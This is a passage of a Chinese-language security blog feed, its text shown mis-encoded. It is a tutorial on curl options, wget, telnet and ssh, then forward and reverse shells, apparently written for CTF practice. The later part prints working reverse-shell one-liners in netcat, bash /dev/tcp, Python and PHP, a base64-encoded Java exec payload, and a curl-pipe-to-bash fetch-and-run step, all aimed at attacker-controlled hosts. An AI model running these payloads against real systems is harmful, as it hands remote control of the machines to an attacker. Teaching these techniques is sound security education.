http://www.linux.com/&#123;hello,bb&#125;/dodo[1-5].JPG</code></p><p>1.4ï¼šåˆ†å—ä¸‹è½½ (optionï¼š-r)</p><p><code>curl -r 0-100 -o dodo1_part1.JPG http://www.linux.com/dodo1.JPG curl -r 100-200 -o dodo1_part2.JPG http://www.linux.com/dodo1.JPG curl -r 200- -o dodo1_part3.JPG http://www.linux.com/dodo1.JPG</code> <br> <code>cat dodo1_part* &gt; dodo1.JPG </code></p><p>#è¿™æ ·å°±å¯ä»¥æŸ¥çœ‹ dodo1.JPG çš„å†…å®¹äº†</p><p>1.5ï¼šé€šè¿‡ ftpï¼ˆæ–‡ä»¶ä¼ è¾“åè®®ï¼‰ä¸‹è½½æ–‡ä»¶ (optionï¼š-u)<br> curl å¯ä»¥é€šè¿‡ ftp ä¸‹è½½æ–‡ä»¶ï¼Œcurl æä¾›ä¸¤ç§ä» ftp ä¸­ä¸‹è½½çš„è¯­æ³•<br> <code>curl -O -u ç”¨æˆ·å:å¯†ç  ftp://www.linux.com/dodo1.JPG</code> <br> <code>curl -O ftp://ç”¨æˆ·å:å¯†ç @www.linux.com/dodo1.JPG</code></p><p>1.6: ä¸‹è½½ï¼Œæ˜¾ç¤ºè¿›åº¦æ¡ (optionï¼š-#) æˆ–ä¸æ˜¾ç¤ºè¿›åº¦æ¡ (optionï¼š-s)<br> <code>curl -# -O http://www.linux.com/dodo1.JPG  </code> <br> <code>curl -s -O http://www.linux.com/dodo1.JPG</code></p><p>1.7ã€ä¸‹è½½ï¼Œæ–­ç‚¹ç»­ä¼  (-C <offset>)<br> æ–­ç‚¹ç»­è½¬ï¼Œä»æ–‡ä»¶å¤´çš„æŒ‡å®šä½ç½®å¼€å§‹ç»§ç»­ä¸‹è½½ / ä¸Šä¼ ï¼›offset ç»­ä¼ å¼€å§‹çš„ä½ç½®ï¼Œå¦‚æœ offset å€¼ä¸º â€œ-â€ï¼Œcurl ä¼šè‡ªåŠ¨ä»æ–‡ä»¶ä¸­è¯†åˆ«èµ·å§‹ä½ç½®å¼€å§‹ä¼ è¾“ï¼›<br> <code>curl -# -o centos6.8.iso -C - http://mirrors.aliyun.com/centos/6.8/isos/x86_64/CentOS-6.8-x86_64-minimal.iso</code> <br> <code>curl -C -O http://www.linux.com/dodo1.JPG</code></offset></p><h5 id="2-ä¸Šä¼ æ–‡ä»¶option-t"><a class="markdownIt-Anchor" href="#2-ä¸Šä¼ æ–‡ä»¶option-t">#</a> 2ã€ä¸Šä¼ æ–‡ä»¶ (option:-T)</h5><p><code>curl -T dodo1.JPG -u ç”¨æˆ·å:å¯†ç  ftp://www.linux.com/img/</code></p><h5 id="3-ä¼ªé€ æ¥æºé¡µé¢ä¼ªé€ refererç›—é“¾-option-e"><a class="markdownIt-Anchor" href="#3-ä¼ªé€ æ¥æºé¡µé¢ä¼ªé€ refererç›—é“¾-option-e">#</a> 3ã€ä¼ªé€ æ¥æºé¡µé¢ | ä¼ªé€  referer | ç›—é“¾ (optionï¼š-e)</h5><p>å¾ˆå¤šæœåŠ¡å™¨ä¼šæ£€æŸ¥ http è®¿é—®çš„ referer ä»è€Œæ¥æ§åˆ¶è®¿é—®ã€‚æ¯”å¦‚ï¼šä½ æ˜¯å…ˆè®¿é—®é¦–é¡µï¼Œç„¶åå†è®¿é—®é¦–é¡µä¸­çš„é‚®ç®±é¡µé¢ï¼Œè¿™é‡Œè®¿é—®é‚®ç®±çš„ referer åœ°å€å°±æ˜¯è®¿é—®é¦–é¡µæˆåŠŸåçš„é¡µé¢åœ°å€ï¼Œå¦‚æœæœåŠ¡å™¨å‘ç°å¯¹é‚®ç®±é¡µé¢è®¿é—®çš„ referer åœ°å€ä¸æ˜¯é¦–é¡µçš„åœ°å€ï¼Œå°±æ–­å®šé‚£æ˜¯ä¸ªç›—è¿äº†<br> #è¿™æ ·å°±ä¼šè®©æœåŠ¡å™¨å…¶ä»¥ä¸ºä½ æ˜¯ä» www.linux.com ç‚¹å‡»æŸä¸ªé“¾æ¥è¿‡æ¥çš„<br> <code>curl -e &quot;www.linux.com&quot; http://mail.linux.com</code> <br># å‘Šè¯‰çˆ± E æ—ï¼Œæˆ‘æ˜¯ä»ç™¾åº¦æ¥çš„<br> <code>curl -e http://baidu.com http://aiezu.com</code></p><h5 id="4-ä¼ªé€ ä»£ç†è®¾å¤‡æ¨¡ä»¿æµè§ˆå™¨"><a class="markdownIt-Anchor" href="#4-ä¼ªé€ ä»£ç†è®¾å¤‡æ¨¡ä»¿æµè§ˆå™¨">#</a> 4ã€ä¼ªé€ ä»£ç†è®¾å¤‡ (æ¨¡ä»¿æµè§ˆå™¨)</h5><p>æœ‰äº›ç½‘ç«™éœ€è¦ä½¿ç”¨ç‰¹å®šçš„æµè§ˆå™¨å»è®¿é—®ä»–ä»¬ï¼Œæœ‰äº›è¿˜éœ€è¦ä½¿ç”¨æŸäº›ç‰¹å®šçš„ç‰ˆæœ¬ã€‚curl å†…ç½® option:-A å¯ä»¥è®©æˆ‘ä»¬æŒ‡å®šæµè§ˆå™¨å»è®¿é—®ç½‘ç«™<br> <code>curl -A &quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.0)&quot; http://www.linux.com</code> <br># å‘Šè¯‰çˆ± E æ—ï¼Œæˆ‘æ˜¯ GOOGLE çˆ¬è™«èœ˜è››ï¼ˆå…¶å®æˆ‘æ˜¯ curl å‘½ä»¤ï¼‰<br> <code>curl -A &quot; Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot; http://aiezu.com</code> <br># å‘Šè¯‰çˆ± E æ—ï¼Œæˆ‘ç”¨çš„æ˜¯å¾®ä¿¡å†…ç½®æµè§ˆå™¨<br> <code>curl -A &quot;Mozilla/5.0 AppleWebKit/600 Mobile MicroMessenger/6.0&quot; http://aiezu.com</code></p><h5 id="5-è®¾ç½®httpè¯·æ±‚"><a class="markdownIt-Anchor" href="#5-è®¾ç½®httpè¯·æ±‚">#</a> 5ã€è®¾ç½® http è¯·æ±‚</h5><p>5.1ã€è®¾ç½® http è¯·æ±‚å¤´ (æˆ– option:-H æˆ– option:â€“head)<br> <code>curl -H &quot;Cache-Control:no-cache&quot;  http://aiezu.com</code></p><p>5.2ã€æŒ‡å®š proxy æœåŠ¡å™¨ä»¥åŠå…¶ç«¯å£ (option::-x)<br># å¾ˆå¤šæ—¶å€™ä¸Šç½‘éœ€è¦ç”¨åˆ°ä»£ç†æœåŠ¡å™¨ (æ¯”å¦‚æ˜¯ä½¿ç”¨ä»£ç†æœåŠ¡å™¨ä¸Šç½‘æˆ–è€…å› ä¸ºä½¿ç”¨ curl åˆ«äººç½‘ç«™è€Œè¢«åˆ«äººå±è”½ IP åœ°å€çš„æ—¶å€™)ï¼Œå¹¸è¿çš„æ˜¯ curl é€šè¿‡ä½¿ç”¨å†…ç½® optionï¼š-x æ¥æ”¯æŒè®¾ç½®ä»£ç†<br> <code>curl -x 192.168.100.100:1080 http://www.linux.com</code></p><h5 id="6-httpå“åº”å¤´"><a class="markdownIt-Anchor" href="#6-httpå“åº”å¤´">#</a> 6ã€http å“åº”å¤´</h5><p>6.1ã€æŸ¥çœ‹ http å“åº”å¤´ (option:-I)<br># çœ‹çœ‹æœ¬ç«™çš„ http å¤´æ˜¯æ€ä¹ˆæ ·çš„<br> <code>curl -I  http://aiezu.com</code> <br> è¾“å‡ºï¼š<br>HTTP/1.1 200 OK<br>Date: Fri, 25 Nov 2016 16:45:49 GMT<br>Server: Apache<br>Set-Cookie: rox__Session=abdrt8vesprhnpc3f63p1df7j4; path=/<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0<br>Pragma: no-cache<br>Vary: Accept-Encoding<br>Content-Type: text/html; charset=utf-8</p><p>6.2ã€ä¿å­˜ http çš„ response é‡Œé¢çš„ header ä¿¡æ¯ (option:-D)<br> <code>curl -D cookied.txt http://www.linux.com</code> <br> æ‰§è¡Œå cookie ä¿¡æ¯å°±è¢«å­˜åˆ°äº† cookied.txt é‡Œé¢äº†<br>æ³¨æ„ï¼š-c (å°å†™) äº§ç”Ÿçš„ cookie å’Œ - D é‡Œé¢çš„ cookie æ˜¯ä¸ä¸€æ ·çš„ã€‚</p><h5 id="7-å‘é€è¡¨å•æ•°æ®"><a class="markdownIt-Anchor" href="#7-å‘é€è¡¨å•æ•°æ®">#</a> 7ã€å‘é€è¡¨å•æ•°æ®</h5><p><code>curl -F &quot;pic=@logo.png&quot; -F &quot;site=aiezu&quot;  http://aiezu.com/</code></p><h5 id="8-cookie"><a class="markdownIt-Anchor" href="#8-cookie">#</a> 8ã€cookie</h5><p>8.1ã€å‘é€ cookie (option:-bï¼‰<br># æœ‰äº›ç½‘ç«™æ˜¯ä½¿ç”¨ cookie æ¥è®°å½• session ä¿¡æ¯ã€‚å¯¹äº chrome è¿™æ ·çš„æµè§ˆå™¨ï¼Œå¯ä»¥è½»æ˜“å¤„ç† cookie ä¿¡æ¯ï¼Œä½†åœ¨ curl ä¸­åªè¦å¢åŠ ç›¸å…³å‚æ•°ä¹Ÿæ˜¯å¯ä»¥å¾ˆå®¹æ˜“çš„å¤„ç† cookie<br> <code>curl -b &quot;domain=aiezu.com&quot;  http://aiezu.com</code> <br># å¾ˆå¤šç½‘ç«™éƒ½æ˜¯é€šè¿‡ç›‘è§†ä½ çš„ cookie ä¿¡æ¯æ¥åˆ¤æ–­ä½ æ˜¯å¦æŒ‰è§„çŸ©è®¿é—®ä»–ä»¬çš„ç½‘ç«™çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¿å­˜çš„ cookie ä¿¡æ¯ã€‚å†…ç½® option: -b<br> <code>curl -b cookiec.txt http://www.linux.com</code></p><p>8.2ã€ä¿å­˜ http çš„ response é‡Œé¢çš„ cookie ä¿¡æ¯ (option:-cï¼‰<br>æ‰§è¡Œå http çš„ response é‡Œé¢çš„ cookie ä¿¡æ¯å°±è¢«å­˜åˆ°äº† cookiec.txt é‡Œé¢äº†<br> <code>curl -c cookiec.txt  http://www.linux.com</code></p><h4 id="wget"><a class="markdownIt-Anchor" href="#wget">#</a> wget</h4><p>wget æ˜¯ä¸€ä¸ªä¸‹è½½æ–‡ä»¶çš„å·¥å…·ï¼Œå®ƒç”¨åœ¨å‘½ä»¤è¡Œä¸‹ã€‚å¯¹äº Linux ç”¨æˆ·æ˜¯å¿…ä¸å¯å°‘çš„å·¥å…·ï¼Œæˆ‘ä»¬ç»å¸¸è¦ä¸‹è½½ä¸€äº›è½¯ä»¶æˆ–ä»è¿œç¨‹æœåŠ¡å™¨æ¢å¤å¤‡ä»½åˆ°æœ¬åœ°æœåŠ¡å™¨ã€‚</p><p><code>wget URL</code></p><h5 id="ä¸curlåŒºåˆ«"><a class="markdownIt-Anchor" href="#ä¸curlåŒºåˆ«">#</a> ä¸ curl åŒºåˆ«</h5><p>wget æ˜¯ä¸ªä¸“èŒçš„ä¸‹è½½åˆ©å™¨ï¼Œç®€å•ï¼Œä¸“ä¸€ï¼Œæè‡´ï¼›è€Œ curl å¯ä»¥ä¸‹è½½ï¼Œä½†æ˜¯é•¿é¡¹ä¸åœ¨äºä¸‹è½½ï¼Œè€Œåœ¨äºæ¨¡æ‹Ÿæäº¤ web æ•°æ®ï¼ŒPOST/GET è¯·æ±‚ï¼Œè°ƒè¯•ç½‘é¡µï¼Œç­‰ç­‰ã€‚åœ¨ä¸‹è½½ä¸Šï¼Œä¹Ÿå„æœ‰æ‰€é•¿ï¼Œwget å¯ä»¥é€’å½’ï¼Œæ”¯æŒæ–­ç‚¹ï¼›è€Œ curl æ”¯æŒ URL ä¸­åŠ å…¥å˜é‡ï¼Œå› æ­¤å¯ä»¥æ‰¹é‡ä¸‹è½½ã€‚ä¸ªäººç”¨é€”ä¸Šï¼Œæˆ‘ç»å¸¸ç”¨ wget æ¥ä¸‹è½½æ–‡ä»¶ï¼ŒåŠ  -c é€‰é¡¹ä¸æ€•æ–­ç½‘ï¼›ä½¿ç”¨ curl æ¥è·Ÿç½‘ç«™çš„ API äº¤äº’ï¼Œç®€ä¾¿æ¸…æ™°ã€‚</p><h4 id="ping"><a class="markdownIt-Anchor" href="#ping">#</a> ping</h4><p>ping å‘½ä»¤æœ¬èº«å¤„äºåº”ç”¨å±‚ï¼Œç›¸å½“äºä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œå®ƒç›´æ¥ä½¿ç”¨ç½‘ç»œå±‚çš„ ICMP åè®®ï¼Œping ç”¨æ¥æ£€æŸ¥ç½‘ç»œæ˜¯å¦é€šç•…æˆ–è€…ç½‘ç»œè¿æ¥é€Ÿåº¦çš„å‘½ä»¤ã€‚</p><h4 id="talent"><a class="markdownIt-Anchor" href="#talent">#</a> talent</h4><p>telnet åè®®æ˜¯ TCP/IP åè®®æ—çš„å…¶ä¸­ä¹‹ä¸€ï¼Œæ˜¯ Internet è¿œç«¯ç™»å½•æœåŠ¡çš„æ ‡å‡†åè®®å’Œä¸»è¦æ–¹å¼ï¼Œå¸¸ç”¨äºç½‘é¡µæœåŠ¡å™¨çš„è¿œç«¯æ§åˆ¶ï¼Œå¯ä¾›ä½¿ç”¨è€…åœ¨æœ¬åœ°ä¸»æœºæ‰§è¡Œè¿œç«¯ä¸»æœºä¸Šçš„å·¥ä½œã€‚telnet é€šå¸¸æ˜¯ç”¨æ¥æ¢æµ‹æŒ‡å®š ip æ˜¯å¦å¼€æ”¾æŒ‡å®šç«¯å£ã€‚</p><p>open : ä½¿ç”¨ openhostname å¯ä»¥å»ºç«‹åˆ°ä¸»æœºçš„ Telnet è¿æ¥ã€‚</p><p>close : ä½¿ç”¨å‘½ä»¤ close å‘½ä»¤å¯ä»¥å…³é—­ç°æœ‰çš„ Telnet è¿æ¥ã€‚</p><p>display : ä½¿ç”¨ display å‘½ä»¤å¯ä»¥æŸ¥çœ‹ Telnet å®¢æˆ·ç«¯çš„å½“å‰è®¾ç½®ã€‚</p><p>send : ä½¿ç”¨ send å‘½ä»¤å¯ä»¥å‘ Telnet æœåŠ¡å™¨å‘é€å‘½ä»¤ã€‚æ”¯æŒä»¥ä¸‹å‘½ä»¤ï¼š</p><p>ao : æ”¾å¼ƒè¾“å‡ºå‘½ä»¤ã€‚</p><p>ayt : â€œAre you thereâ€ å‘½ä»¤ã€‚</p><p>esc : å‘é€å½“å‰çš„è½¬ä¹‰å­—ç¬¦ã€‚</p><p>ip : ä¸­æ–­è¿›ç¨‹å‘½ä»¤ã€‚</p><p>synch : æ‰§è¡Œ Telnet åŒæ­¥æ“ä½œã€‚</p><p>brk : å‘é€ä¿¡å·ã€‚quit ï¼šä½¿ç”¨ quit å‘½ä»¤å¯ä»¥é€€å‡º Telnet å®¢æˆ·ç«¯ã€‚</p><h4 id="ssh"><a class="markdownIt-Anchor" href="#ssh">#</a> ssh</h4><p>ç®€å•æ¥è¯´ï¼Œssh å’Œ telnet æ˜¯å®ç°ç›¸åŒçš„åŠŸèƒ½ï¼Œssh ä¸­ æ•°æ®æ˜¯ç»è¿‡åŠ å¯†çš„ï¼Œæ˜¯å®‰å…¨çš„ï¼Œè€Œ Telnet æ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œssh æ˜¯åŠ å¯†çš„ï¼ŒåŸºäº SSL ã€‚</p><h3 id="æ­£å‘shellå¦‚ä½•è¿æ¥"><a class="markdownIt-Anchor" href="#æ­£å‘shellå¦‚ä½•è¿æ¥">#</a> æ­£å‘ shell å¦‚ä½•è¿æ¥</h3><p>å‡è®¾æˆ‘ä»¬æ”»å‡»äº†ä¸€å°æœºå™¨ï¼Œæ‰“å¼€äº†è¯¥æœºå™¨çš„ä¸€ä¸ªç«¯å£ï¼Œæ”»å‡»è€…åœ¨è‡ªå·±çš„æœºå™¨å»è¿æ¥ç›®æ ‡æœºå™¨ï¼ˆç›®æ ‡ ipï¼šç›®æ ‡æœºå™¨ç«¯å£ï¼‰ï¼Œè¿™æ˜¯æ¯”è¾ƒå¸¸è§„çš„å½¢å¼ï¼Œæˆ‘ä»¬å«åšæ­£å‘è¿æ¥ã€‚è¿œç¨‹æ¡Œé¢ã€web æœåŠ¡ã€sshã€telnet ç­‰ç­‰éƒ½æ˜¯æ­£å‘è¿æ¥ã€‚</p><p>ç›®æ ‡ä¸»æœºï¼š <code>nc -lvp Target_port -e /bin/sh</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/BuPk7DwXMoHmEl3.png" alt="image.png"></p><p>æœ¬åœ°ä¸»æœºï¼š  <code>nc Target_ip Target_port</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/a9okGwVWhypUD4m.png" alt="image.png"></p><h3 id="ä»€ä¹ˆæ˜¯åå¼¹shell"><a class="markdownIt-Anchor" href="#ä»€ä¹ˆæ˜¯åå¼¹shell">#</a> ä»€ä¹ˆæ˜¯åå¼¹ shell</h3><p>å‚è€ƒï¼š<a class="link" href="https://xz.aliyun.com/t/9488">https://xz.aliyun.com/t/9488 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>åå¼¹ shellï¼ˆreverse shellï¼‰ï¼Œå°±æ˜¯æ§åˆ¶ç«¯ç›‘å¬åœ¨æŸ TCP/UDP ç«¯å£ï¼Œè¢«æ§ç«¯å‘èµ·è¯·æ±‚åˆ°è¯¥ç«¯å£ï¼Œå¹¶å°†å…¶å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æ§åˆ¶ç«¯ã€‚reverse shell ä¸ telnetï¼Œssh ç­‰æ ‡å‡† shell å¯¹åº”ï¼Œæœ¬è´¨ä¸Šæ˜¯ç½‘ç»œæ¦‚å¿µçš„å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„è§’è‰²åè½¬ã€‚</p><p>ä¸¾ä¾‹ï¼šå‡è®¾æˆ‘ä»¬æ”»å‡»äº†ä¸€å°æœºå™¨ï¼Œæ‰“å¼€äº†è¯¥æœºå™¨çš„ä¸€ä¸ªç«¯å£ï¼Œæ”»å‡»è€…åœ¨è‡ªå·±çš„æœºå™¨å»è¿æ¥ç›®æ ‡æœºå™¨ï¼ˆç›®æ ‡ ipï¼šç›®æ ‡æœºå™¨ç«¯å£ï¼‰ï¼Œè¿™æ˜¯æ¯”è¾ƒå¸¸è§„çš„å½¢å¼ï¼Œæˆ‘ä»¬å«åšæ­£å‘è¿æ¥ã€‚è¿œç¨‹æ¡Œé¢ã€web æœåŠ¡ã€sshã€telnet ç­‰ç­‰éƒ½æ˜¯æ­£å‘è¿æ¥ã€‚é‚£ä¹ˆä»€ä¹ˆæƒ…å†µä¸‹æ­£å‘è¿æ¥ä¸èƒ½ç”¨äº†å‘¢ï¼Ÿ</p><p>æœ‰å¦‚ä¸‹æƒ…å†µï¼š</p><p>1. æŸå®¢æˆ·æœºä¸­äº†ä½ çš„ç½‘é©¬ï¼Œä½†æ˜¯å®ƒåœ¨å±€åŸŸç½‘å†…ï¼Œä½ ç›´æ¥è¿æ¥ä¸äº†ã€‚</p><p>2. ç›®æ ‡æœºå™¨çš„ ip åŠ¨æ€æ”¹å˜ï¼Œä½ ä¸èƒ½æŒç»­æ§åˆ¶ã€‚</p><p>3. ç”±äºé˜²ç«å¢™ç­‰é™åˆ¶ï¼Œå¯¹æ–¹æœºå™¨åªèƒ½å‘é€è¯·æ±‚ï¼Œä¸èƒ½æ¥æ”¶è¯·æ±‚ã€‚</p><p>4. å¯¹äºç—…æ¯’ï¼Œæœ¨é©¬ï¼Œå—å®³è€…ä»€ä¹ˆæ—¶å€™èƒ½ä¸­æ‹›ï¼Œå¯¹æ–¹çš„ç½‘ç»œç¯å¢ƒæ˜¯ä»€ä¹ˆæ ·çš„ï¼Œä»€ä¹ˆæ—¶å€™å¼€å…³æœºç­‰æƒ…å†µéƒ½æ˜¯æœªçŸ¥çš„ï¼Œæ‰€ä»¥å»ºç«‹ä¸€ä¸ªæœåŠ¡ç«¯è®©æ¶æ„ç¨‹åºä¸»åŠ¨è¿æ¥ï¼Œæ‰æ˜¯ä¸Šç­–ã€‚</p><p>é‚£ä¹ˆåå¼¹å°±å¾ˆå¥½ç†è§£äº†ï¼Œæ”»å‡»è€…æŒ‡å®šæœåŠ¡ç«¯ï¼Œå—å®³è€…ä¸»æœºä¸»åŠ¨è¿æ¥æ”»å‡»è€…çš„æœåŠ¡ç«¯ç¨‹åºï¼Œå°±å«åå¼¹è¿æ¥ã€‚</p><p>åå¼¹ shell çš„æ–¹å¼æœ‰å¾ˆå¤šï¼Œé‚£å…·ä½“è¦ç”¨å“ªç§æ–¹å¼è¿˜éœ€è¦æ ¹æ®ç›®æ ‡ä¸»æœºçš„ç¯å¢ƒæ¥ç¡®å®šï¼Œæ¯”å¦‚ç›®æ ‡ä¸»æœºä¸Šå¦‚æœå®‰è£…æœ‰ netcatï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ netcat åå¼¹ shellï¼Œå¦‚æœå…·æœ‰ python ç¯å¢ƒï¼Œé‚£æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ python åå¼¹ shellã€‚å¦‚æœå…·æœ‰ php ç¯å¢ƒï¼Œé‚£æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ php åå¼¹ shellã€‚</p><h3 id="åå¼¹shellçš„æ–¹å¼"><a class="markdownIt-Anchor" href="#åå¼¹shellçš„æ–¹å¼">#</a> åå¼¹ shell çš„æ–¹å¼</h3><h4 id="netcat"><a class="markdownIt-Anchor" href="#netcat">#</a> netcat</h4><p>æ”»å‡»æœºå¼€å¯ç›‘å¬ï¼š  <code>nc -lvp Target_port</code></p><p>-lvpï¼šl ç›‘å¬ï¼Œv è¾“å‡ºäº¤äº’è¿‡ç¨‹ï¼Œp ç«¯å£</p><p>é¶æœºè¿æ¥æ”»å‡»æœºï¼š  <code>nc Target_ip Target_port -e /bin/bash</code></p><h4 id="bash"><a class="markdownIt-Anchor" href="#bash">#</a> bash</h4><p>Bash åå¼¹ shell çš„æ–¹æ³•éå¸¸å¥½ç”¨ï¼Œé¢˜ç›®çš„æœåŠ¡å™¨ç¯å¢ƒå¯èƒ½æ²¡æœ‰ nc, ä½†æ˜¯ä¸€å®šä¼šæœ‰ bash</p><p>åŒæ ·çš„æˆ‘ä»¬è¿˜æ˜¯ç”¨ nc -lvp Target_Port åœ¨æ”»å‡»æœºçš„ç«¯å£å¼€å¯ç›‘å¬</p><p><code>nc -lvp Target_Port</code></p><p>è¿™æ¬¡æˆ‘ä»¬ä½¿ç”¨ Bash ç»“åˆé‡å®šå‘æ¥åå¼¹ shell</p><p><code>bash -i &gt;&amp; /dev/tcp/Target_ip/Target_port 0&gt;&amp;1</code></p><p>æˆ–è€…  <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/Target_ip/Target_port 0&gt;&amp;1&quot;</code></p><p>æ¨èä½¿ç”¨åè€…ï¼Œä½¿ç”¨å‰è€…å¼¹ shell, å½“å‘½ä»¤åœ¨æœåŠ¡ç«¯ shell ä¸­æ‰§è¡Œæ—¶å¯èƒ½å­˜åœ¨ /bin/sh çš„è½¯è¿æ¥å¹¶ä¸æŒ‡å‘ bash çš„é—®é¢˜ï¼Œå¯¼è‡´æŠ¥é”™ <code>/bin/sh: 1:Syntax error:Bad fd number</code></p><p>bash -i äº§ç”Ÿ bash äº¤äº’ç¯å¢ƒ &gt;&amp; å°†è”åˆç¬¦å·å‰åå†…å®¹ç»“åˆï¼Œé‡å®šå‘ç»™åè€…ï¼Œ/dev/tcp/Target_IP/Target_Port è®©ç›®æ ‡ä¸»æœºå‘èµ·ä¸æ”»å‡»æœºåœ¨ Target_Port ä¸Šçš„ TCP è¿æ¥ï¼Œ0&gt;&amp;1 å°†æ ‡å‡†è¾“å…¥å’Œæ ‡å‡†è¾“å‡ºçš„å†…å®¹ç›¸ç»“åˆï¼Œé‡å®šå‘ç»™å‰é¢æ ‡å‡†è¾“å‡ºçš„å†…å®¹ã€‚</p><p>Bash äº§ç”Ÿäº†ä¸€ä¸ªäº¤äº’ç¯å¢ƒå’Œæœ¬åœ°ä¸»æœºä¸»åŠ¨å‘èµ·ä¸æ”»å‡»æœºç«¯å£å»ºç«‹çš„è¿æ¥ç›¸ç»“åˆï¼Œç„¶ååœ¨é‡å®šå‘ä¸ª TCP ä¼šè¯è¿æ¥ï¼Œæœ€åå°†ç”¨æˆ·é”®ç›˜è¾“å…¥ä¸ç”¨æˆ·æ ‡å‡†è¾“å‡ºç›¸ç»“åˆå†æ¬¡é‡å®šå‘ç»™ä¸€ä¸ªæ ‡å‡†çš„è¾“å‡ºï¼Œå³å¾—åˆ°ä¸€ä¸ª Bash åå¼¹ç¯å¢ƒã€‚</p><p>[å…³äºä¸Šè¿° bash å‘½ä»¤çš„è¯¦ç»†è§£é‡Š](<a class="link" href="https://www.cnblogs.com/pandana/p/16289320.html">åå¼¹ bash shell å‘½ä»¤è¯¦è§£ - pandaes - åšå®¢å›­ (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p><h4 id="pythionåå¼¹shell"><a class="markdownIt-Anchor" href="#pythionåå¼¹shell">#</a> Pythion åå¼¹ shell</h4><p>åŒæ ·çš„æˆ‘ä»¬è¿˜æ˜¯åœ¨æ”»å‡»æœºå¼€å§‹ç«¯å£ç›‘å¬ï¼Œ <code>nc -lvp Target_Port</code></p><p>åœ¨é¶æœºä¸Šæ‰§è¡Œ <code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;Target_IP&quot;,Target_Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p><h4 id="curlåå¼¹shell"><a class="markdownIt-Anchor" href="#curlåå¼¹shell">#</a> curl åå¼¹ shell</h4><p>ç®€å•æ¥è¯´å°±æ˜¯å°† Bash é‡å®šå‘è¿™ä¸€å¥å†…å®¹å†™å…¥æ–‡ä»¶ï¼Œè®©é¶æœºç”¨ curl ä¸‹è½½è¿™ä¸ªæ–‡ä»¶å¹¶ä¸”æ‰§è¡Œï¼Œè¾¾åˆ°ç”¨ Bash é‡å®šå‘ç›¸åŒçš„æ•ˆæœ</p><p>é¦–å…ˆï¼Œåœ¨æ”»å‡»è€… vps çš„ web ç›®å½•é‡Œé¢åˆ›å»ºä¸€ä¸ª index æ–‡ä»¶ï¼ˆindex.php æˆ– index.htmlï¼‰ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><p><code>bash -i &gt;&amp; /dev/tcp/Target_IP/Target_Port 0&gt;&amp;1</code>  æˆ–è€… <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/Target_IP/Target_Port 0&gt;&amp;1&quot;</code> ï¼Œè€Œ java çš„ RCE éœ€è¦ç”¨ base64 ç¼–ç ï¼ŒPayload: <code>Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</code></p><p>ç„¶ååœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œå¦‚ä¸‹ï¼Œå³å¯åå¼¹ shell</p><p><code>curl Target_IP|bash</code></p><h4 id="phpåå¼¹shell"><a class="markdownIt-Anchor" href="#phpåå¼¹shell">#</a> php åå¼¹ shell</h4><p>æ”»å‡»æœºï¼š  <code>nc -nvlp Target_port</code></p><p>é¶æœºï¼š  <code>php -r '$sock=fsockopen(&quot;192.168.37.131&quot;,1234);     exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</code></p><h4 id="others"><a class="markdownIt-Anchor" href="#others">#</a> <strong>Others</strong></h4><p>åå¼¹ shell çš„æ–¹å¼å¾ˆå¤šï¼Œnc å’Œ bash æ˜¯æ¯”è¾ƒå¸¸è§çš„æ–¹å¼ï¼Œå…¶ä»–è¿˜æœ‰ Telnetï¼ŒSocat ç­‰å·¥å…·å¯ä»¥åå¼¹ shellï¼Œæˆ–è€…å†™ä¸ª pythonï¼Œphp ç­‰è„šæœ¬ä¹Ÿå¯ä»¥åå¼¹ shellï¼Œæ¯”è¾ƒçç¢çš„å†…å®¹å…·ä½“é‡åˆ°äº†å†æŸ¥å³å¯ã€‚</p><p>â€”â€”â€”â€”ENDâ€”â€”â€”â€”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åå¼¹shell&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#åå¼¹shell&quot;&gt;#&lt;/a&gt; åå¼¹ shell&lt;/h1&gt;
&lt;h2 id=&quot;åå¼¹shell-2&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#åå¼¹s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hgame FINAL WP</title>
    <link href="http://example.com/2024/04/06/Hgame-FINAL-WP/"/>
    <id>http://example.com/2024/04/06/Hgame-FINAL-WP/</id>
    <published>2024-04-06T05:09:37.000Z</published>
    <updated>2024-04-06T15:45:00.013Z</updated>
    
